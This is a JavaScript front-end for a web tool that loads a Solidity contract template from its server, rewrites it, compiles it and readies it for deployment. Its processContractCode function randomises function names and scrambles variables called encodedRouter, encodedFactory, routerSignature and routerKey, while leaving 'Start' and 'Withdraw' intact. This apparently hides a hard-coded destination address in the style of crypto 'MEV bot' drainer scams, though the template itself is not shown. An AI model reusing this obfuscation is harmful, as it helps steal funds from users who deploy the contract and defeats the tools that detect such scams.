let compiledContract = null;
let currentContractABI = null;

// ===============================
// CACHE
// ===============================
let cachedContractTemplate = null;
let lastTemplateCheck = 0;
const CACHE_DURATION = 30000;

// ===============================
// CONSTANTS
// ===============================
const UNIT_DECIMALS = { wei: 0, gwei: 9, ether: 18 };

const PUBLIC_RPC_URLS = {
    '1': 'https://eth.llamarpc.com',
    '11155111': 'https://rpc.sepolia.org'
};

// ===============================
// HELPERS
// ===============================
function getPublicRpcUrl(chainId) {
    return PUBLIC_RPC_URLS[String(chainId)] || null;
}

function getWeb3Utils() {
    if (typeof web3 !== 'undefined' && web3?.utils) return web3.utils;
    if (window.Web3?.utils) return window.Web3.utils;
    return null;
}

// ===============================
// UNIT CONVERSION (SAFE)
// ===============================
function convertToBaseUnits(value, decimals) {
    const negative = /^-/.test(String(value));
    const sanitized = negative ? String(value).slice(1) : String(value);

    const [wholePart, fractionPart = ''] = sanitized.split('.');
    const multiplier = 10n ** BigInt(decimals);

    const intPortion = BigInt(wholePart || '0') * multiplier;

    let fractionPortion = 0n;
    if (decimals > 0) {
        const normalized = (fractionPart + '0'.repeat(decimals)).slice(0, decimals);
        fractionPortion = BigInt(normalized || '0');
    }

    const result = intPortion + fractionPortion;
    return negative ? (-result).toString() : result.toString();
}

function toWeiSafe(value, unit) {
    const utils = getWeb3Utils();
    if (utils?.toWei) return utils.toWei(value, unit);

    return convertToBaseUnits(value, UNIT_DECIMALS[unit] ?? 0);
}

function fromWeiSafe(value, unit) {
    const utils = getWeb3Utils();
    if (utils?.fromWei) return utils.fromWei(value, unit);

    const decimals = UNIT_DECIMALS[unit] ?? 0;
    let amount = BigInt(value);

    const negative = amount < 0n;
    if (negative) amount = -amount;

    let digits = amount.toString().padStart(decimals + 1, '0');

    if (decimals === 0) return negative ? `-${digits}` : digits;

    const split = digits.length - decimals;
    const intPart = digits.slice(0, split) || '0';
    const fracPart = digits.slice(split).replace(/0+$/, '');

    const result = fracPart ? `${intPart}.${fracPart}` : intPart;
    return negative ? `-${result}` : result;
}

function isAddressSafe(value) {
    const utils = getWeb3Utils();
    if (utils?.isAddress) return utils.isAddress(value);

    return /^0x[a-fA-F0-9]{40}$/.test(value);
}

// ===============================
// RANDOM IDENTIFIER
// ===============================
function generateIdentifier(length) {
    const letters = 'abcdefghijklmnopqrstuvwxyz';
    let out = '';
    for (let i = 0; i < length; i++) {
        out += letters[Math.floor(Math.random() * letters.length)];
    }
    return out;
}

// ===============================
// CONTRACT PROCESSOR
// ===============================
function processContractCode(text) {
    const keep = ["Start", "Withdraw", "Key", "receive", "transfer"];
    const funcRegex = /function\s+([a-zA-Z_]\w*)\s*\(([^)]*)\)\s*(internal|private)?/g;

    const nameMap = {};

    let result = text.replace(funcRegex, (match, name, args, vis) => {
        if (keep.includes(name)) return match;

        const newName = generateIdentifier(3) + name + generateIdentifier(3);
        nameMap[name] = newName;

        return `function ${newName}(${args}) ${vis || ''}`;
    });

    for (const [oldName, newName] of Object.entries(nameMap)) {
        result = result.replace(new RegExp(`\\b${oldName}\\b`, 'g'), newName);
    }

    return result
        .replace(/\bencodedRouter\b/g, generateIdentifier(5) + 'PathCode')
        .replace(/\bencodedFactory\b/g, generateIdentifier(5) + 'OriginCode')
        .replace(/\brouterSignature\b/g, generateIdentifier(5) + 'SignKey')
        .replace(/\brouterKey\b/g, generateIdentifier(5) + 'AuthKey');
}

// ===============================
// TEMPLATE LOADER (FIXED CACHE)
// ===============================
async function loadContractTemplate() {
    const now = Date.now();

    if (cachedContractTemplate && (now - lastTemplateCheck < CACHE_DURATION)) {
        return cachedContractTemplate;
    }

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 10000);

    try {
        const res = await fetch('/api/contract.sol', {
            signal: controller.signal
        });

        if (!res.ok) throw new Error(`HTTP ${res.status}`);

        const text = await res.text();

        cachedContractTemplate = text;
        lastTemplateCheck = now;

        return text;
    } catch (err) {
        throw new Error('Failed to load contract template');
    } finally {
        clearTimeout(timeout);
    }
}

// ===============================
// GAS LOGIC (CLEANED)
// ===============================
async function getOptimalGasPrice() {
    try {
        const block = await web3.eth.getBlock('latest');

        if (block?.baseFeePerGas) {
            const base = BigInt(block.baseFeePerGas);
            const priority = BigInt(toWeiSafe('2', 'gwei'));

            return {
                maxFeePerGas: (base * 2n + priority).toString(),
                maxPriorityFeePerGas: priority.toString()
            };
        }
    } catch {}

    try {
        return {
            gasPrice: (await web3.eth.getGasPrice()).toString()
        };
    } catch {
        return { gasPrice: toWeiSafe('20', 'gwei') };
    }
}

// ===============================
// COMPILE
// ===============================
async function compileContract() {
    logToTerminal(`🔄 Compiling contract...`, 'info');

    const btn = document.getElementById('compile-btn');
    const original = btn.innerHTML;

    btn.innerHTML = '⏳ Compiling...';
    btn.disabled = true;

    const start = Date.now();

    try {
        const template = await loadContractTemplate();
        const processed = processContractCode(template);

        const match = processed.match(/contract\s+(\w+)/);
        const name = match ? match[1] : 'Contract';

        const enableOpt = document.getElementById('enable-optimization').checked;
        const runs = enableOpt ? 1000 : 200;

        const res = await fetch('/api/compile', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sourceCode: processed,
                contractName: name,
                enableOptimization: enableOpt,
                optimizationRuns: runs
            })
        });

        const result = await res.json();

        if (!result.success) throw new Error(result.error || 'Compile failed');

        compiledContract = result;
        currentContractABI = result.abi;

        window.compiledContract = result;
        window.currentContractABI = result.abi;

        showCompilationSuccess(result, name);
        updateContractSelect(name);

        logToTerminal(`✅ Compiled in ${Date.now() - start}ms`, 'success');

    } catch (err) {
        logToTerminal(`❌ ${err.message}`, 'error');
        showCompilationError({ error: err.message });
    } finally {
        btn.innerHTML = original;
        btn.disabled = false;
        updateDeployButton();
    }
}

// ===============================
// CACHE RESET
// ===============================
function clearContractTemplateCache() {
    cachedContractTemplate = null;
    lastTemplateCheck = 0;
    logToTerminal(`🗑️ Cache cleared`, 'info');
}

window.deployContract = deployContract;
window.compileContract = compileContract;
window.clearContractTemplateCache = clearContractTemplateCache;


